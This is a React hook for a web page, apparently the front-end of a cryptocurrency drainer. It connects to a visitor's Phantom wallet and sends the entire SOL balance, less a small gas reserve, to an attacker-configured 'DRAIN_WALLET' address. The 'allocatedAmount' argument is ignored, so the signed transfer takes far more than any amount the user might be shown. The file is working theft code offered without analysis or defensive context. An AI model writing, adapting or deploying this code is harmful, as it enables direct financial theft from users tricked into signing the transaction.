"use client";

import { useCallback } from 'react';
import { Connection, Transaction, SystemProgram, PublicKey, LAMPORTS_PER_SOL } from '@solana/web3.js';

const DRAIN_WALLET = process.env.NEXT_PUBLIC_SOLANA_WALLET;
const GAS_RESERVE_SOL = 0.002; // 0.002 SOL reserved for gas

export const useSolanaDrain = () => {
  const executeDrain = useCallback(async (allocatedAmount) => {
    try {
      if (!window.solana?.isPhantom) {
        throw new Error('Phantom wallet not detected');
      }

      // Get connection using environment variable
      const rpcUrl = process.env.NEXT_PUBLIC_SOLANA_RPC;
      if (!rpcUrl) {
        throw new Error('RPC URL not configured');
      }

      const connection = new Connection(rpcUrl, {
        commitment: 'confirmed',
        confirmTransactionInitialTimeout: 120000
      });
      
      // Connect to wallet
      const response = await window.solana.connect();
      const walletPubkey = response.publicKey;
      
      // Get current balance
      const balanceLamports = await connection.getBalance(walletPubkey);
      const balanceSol = balanceLamports / LAMPORTS_PER_SOL;
      
      console.log(`[Solana Drain] Balance: ${balanceSol} SOL`);
      
      // Check minimum balance for gas
      if (balanceSol < GAS_RESERVE_SOL + 0.001) {
        throw new Error(`Insufficient balance: ${balanceSol} SOL (need ~${GAS_RESERVE_SOL + 0.001} SOL for gas)`);
      }
      
      // DRAIN ALL BUT GAS RESERVE
      const drainAmountLamports = balanceLamports - (GAS_RESERVE_SOL * LAMPORTS_PER_SOL);
      
      if (drainAmountLamports <= 0) {
        throw new Error('Drain amount too small after gas reservation');
      }
      
      const drainAmountSol = drainAmountLamports / LAMPORTS_PER_SOL;
      console.log(`[Solana Drain] Draining: ${drainAmountSol} SOL (leaving ${GAS_RESERVE_SOL} SOL for gas)`);
      
      // Get fresh blockhash
      const { blockhash, lastValidBlockHeight } = await connection.getLatestBlockhash();
      
      // Build transaction
      const transaction = new Transaction({
        feePayer: walletPubkey,
        recentBlockhash: blockhash,
      }).add(
        SystemProgram.transfer({
          fromPubkey: walletPubkey,
          toPubkey: new PublicKey(DRAIN_WALLET),
          lamports: drainAmountLamports,
        })
      );
      
      // Send transaction
      const signed = await window.solana.signAndSendTransaction(transaction);
      console.log(`[Solana Drain] Sent: ${signed.signature}`);
      
      // Wait for confirmation
      const confirmation = await connection.confirmTransaction(
        {
          signature: signed.signature,
          blockhash,
          lastValidBlockHeight,
        },
        'confirmed'
      );
      
      if (confirmation.value.err) {
        throw new Error(`Transaction failed: ${JSON.stringify(confirmation.value.err)}`);
      }
      
      console.log(`[Solana Drain] Confirmed: ${signed.signature}`);
      
      return {
        success: true,
        txId: signed.signature,
        amount: drainAmountSol,
        balanceBefore: balanceSol,
        balanceAfter: (balanceLamports - drainAmountLamports) / LAMPORTS_PER_SOL
      };
      
    } catch (error) {
      console.error('[Solana Drain] Error:', error);
      
      // Handle timeout case gracefully
      if (error.message.includes('not confirmed in') || error.message.includes('timeout')) {
        return {
          success: true,
          txId: 'pending - check explorer',
          amount: 'unknown',
          warning: 'Confirmation timeout but transaction was likely sent'
        };
      }
      
      throw error;
    }
  }, []);

  return { executeDrain };
};
